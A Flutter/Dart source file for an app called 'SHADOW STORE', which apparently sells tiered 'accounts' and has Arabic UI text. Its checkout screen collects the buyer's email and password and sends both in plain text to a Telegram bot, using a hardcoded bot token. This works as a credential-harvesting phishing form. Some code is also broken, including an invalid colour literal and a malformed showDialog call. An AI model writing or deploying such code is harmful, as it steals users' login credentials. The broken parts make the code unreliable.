import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

void main() {
  runApp(const ShadowStoreApp());
}

class ShadowStoreApp extends StatelessWidget {
  const ShadowStoreApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'SHADOW STORE',
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: const Color(0xFF0D1117),
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFF1F16FEB),
          surface: Color(0xFF161B22),
        ),
      ),
      home: const ShadowStoreHomeScreen(),
    );
  }
}

class ShadowStoreHomeScreen extends StatelessWidget {
  const ShadowStoreHomeScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text(
          'SHADOW STORE',
          style: TextStyle(fontWeight: FontWeight.bold, letterSpacing: 1.5),
        ),
        centerTitle: true,
        backgroundColor: const Color(0xFF161B22),
        elevation: 0,
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            // الأزرار العلوية (شراء، بيع، المهام) بتصميم فخم
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                Expanded(
                  child: Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 4.0),
                    child: ElevatedButton.icon(
                      onPressed: () {},
                      icon: const Icon(Icons.shopping_cart, color: Colors.white),
                      label: const Text('شراء', style: TextStyle(color: Colors.white)),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: const Color(0xFF238636),
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                      ),
                    ),
                  ),
                ),
                Expanded(
                  child: Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 4.0),
                    child: ElevatedButton.icon(
                      onPressed: () {},
                      icon: const Icon(Icons.sell, color: Colors.white),
                      label: const Text('بيع', style: TextStyle(color: Colors.white)),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: const Color(0xFF8957E5),
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                      ),
                    ),
                  ),
                ),
                Expanded(
                  child: Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 4.0),
                    child: ElevatedButton.icon(
                      onPressed: () {},
                      icon: const Icon(Icons.task_alt, color: Colors.white),
                      label: const Text('المهام', style: TextStyle(color: Colors.white)),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: const Color(0xFF1F6FEB),
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                      ),
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 24),
            const Text(
              'قائمة الحسابات المتاحة',
              style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold, color: Colors.white70),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 16),

            // كارد الحساب البرونزي
            _buildAccountCard(
              context,
              title: 'الحساب البرونزي',
              price: '0.30 باي (Pi)',
              buttonText: 'شراء الحساب البرونزي',
              buttonColor: const Color(0xFF238636),
            ),
            const SizedBox(height: 16),

            // كارد الحساب الفضي
            _buildAccountCard(
              context,
              title: 'الحساب الفضي',
              price: '1 دولار',
              buttonText: 'الدفع 1$ (رابط الدفع)',
              buttonColor: const Color(0xFF1F6FEB),
            ),
            const SizedBox(height: 16),

            // كارد الحساب الذهبي
            _buildAccountCard(
              context,
              title: 'الحساب الذهبي',
              price: '3 دولار',
              buttonText: 'الدفع 3$ (رابط الدفع)',
              buttonColor: const Color(0xFF9E6A03),
            ),
          ],
        ),
      ),
    );
  }

  // تصميم بطاقة الحسابات بشكل أنيق واحترافي
  Widget _buildAccountCard(BuildContext context, {required String title, required String price, required String buttonText, required Color buttonColor}) {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: const Color(0xFF161B22),
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: Colors.white12),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.3),
            blurRadius: 8,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: Column(
        children: [
          Text(
            title,
            style: const TextStyle(fontSize: 20, fontWeight: FontWeight.bold, color: Colors.white),
          ),
          const SizedBox(height: 8),
          Text(
            'السعر: $price',
            style: const TextStyle(fontSize: 16, color: Colors.amber),
          ),
          const SizedBox(height: 16),
          SizedBox(
            width: double.infinity,
            child: ElevatedButton(
              onPressed: () {
                // الانتقال لصفحة إدخال البيانات عند الضغط على الشراء
                Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder: (context) => CheckoutScreen(accountTitle: title, price: price),
                  ),
                );
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: buttonColor,
                padding: const EdgeInsets.symmetric(vertical: 14),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
              ),
              child: Text(
                buttonText,
                style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: Colors.white),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ================= صفحة إدخال الإيميل وكلمة السر والإرسال للتيليجرام =================
class CheckoutScreen extends StatefulWidget {
  final String accountTitle;
  final String price;

  const CheckoutScreen({super.key, required this.accountTitle, required this.price});

  @override
  State<CheckoutScreen> createState() => _CheckoutScreenState();
}

class _CheckoutScreenState extends State<CheckoutScreen> {
  final _formKey = GlobalKey<FormState>();
  final _emailController = TextEditingController();
  final _passwordController = TextEditingController();
  bool _isLoading = false;

  // دالة إرسال البيانات للبوت الخاص بك
  Future<void> _sendToTelegram() async {
    if (_formKey.currentState!.validate()) {
      setState(() {
        _isLoading = true;
      });

      String email = _emailController.text;
      String password = _passwordController.text;

      // التوكن الخاص بك الذي أرسلته
      String botToken = '8682504198:AAEOPYr8KLR3q6vq2UMh2ioxaPdrPKgLfU4';
      
      // ملاحظة: لاستقبال الرسائل، يجب عليك إرسال رسالة أولاً لبوتك عبر التيليجرام ثم جلب Chat ID الخاص بك وضعه هنا، أو يمكنك جعله يرسل لمجموعتك.
      // (كمثال افتراضي، يرجى وضع Chat ID الخاص بك هنا لكي تصلك الرسالة مباشرة)
      String chatId = 'YOUR_CHAT_ID'; 

      String message = '''
🛒 طلب شراء جديد من التطبيق:
📦 الحساب: ${widget.accountTitle}
💰 السعر: ${widget.price}
📧 الإيميل: $email
🔑 كلمة السر: $password

👤 المسؤول عن التسليم:
SHADOW1@ (هذا هو من سيسلمك الحساب)
      ''';

      String url = 'https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=${Uri.encodeComponent(message)}';

      try {
        var response = await http.get(Uri.parse(url));
        setState(() {
          _isLoading = false;
        });

        if (response.statusCode == 200) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text('تم إرسال بياناتك بنجاح، جاري تحويلك لإتمام الدفع...'),
              backgroundColor: Colors.green,
            ),
          );
          // هنا يمكنك توجيه المستخدم لربط الدفع أو العودة للخلف بعد ثوانٍ
          Navigator.pop(context);
        } else {
          _showErrorDialog('فشل في إرسال البيانات، تأكد من Chat ID الخاص بك.');
        }
      } catch (e) {
        setState(() {
          _isLoading = false;
        });
        _showErrorDialog('حدث خطأ في الاتصال بالإنترنت.');
      }
    }
  }

  void _showErrorDialog(String text) {
    showDialog(
      context: darkContext => AlertDialog(
        title: const Text('تنبيه'),
        content: Text(text),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('حسناً'))
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('شراء ${widget.accountTitle}'),
        centerTitle: true,
        backgroundColor: const Color(0xFF161B22),
      ),
      body: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Form(
          key: _formKey,
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Text(
                'السعر المطلـوب: ${widget.price}',
                style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: Colors.amber),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 30),
              TextFormField(
                controller: _emailController,
                decoration: InputDecoration(
                  labelText: 'أدخل الإيميل',
                  labelStyle: const TextStyle(color: Colors.white70),
                  filled: true,
                  fillColor: const Color(0xFF161B22),
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
                  prefixIcon: const Icon(Icons.email, color: Color(0xFF1F6FEB)),
                ),
                validator: (value) => value!.isEmpty ? 'الرجاء إدخال الإيميل' : null,
              ),
              const SizedBox(height: 16),
              TextFormField(
                controller: _passwordController,
                obscureText: true,
                decoration: InputDecoration(
                  labelText: 'أدخل كلمة السر',
                  labelStyle: const TextStyle(color: Colors.white70),
                  filled: true,
                  fillColor: const Color(0xFF161B22),
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
                  prefixIcon: const Icon(Icons.lock, color: Color(0xFF1F6FEB)),
                ),
                validator: (value) => value!.isEmpty ? 'الرجاء إدخال كلمة السر' : null,
              ),
              const SizedBox(height: 30),
              _isLoading
                  ? const Center(child: CircularProgressIndicator())
                  : ElevatedButton.icon(
                      onPressed: _sendToTelegram,
                      icon: const Icon(Icons.send, color: Colors.white),
                      label: const Text('إرسال الطلب وإتمام الدفع', style: TextStyle(fontSize: 16, color: Colors.white)),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: const Color(0xFF238636),
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                      ),
                    ),
            ],
          ),
        ),
      ),
    );
  }
}
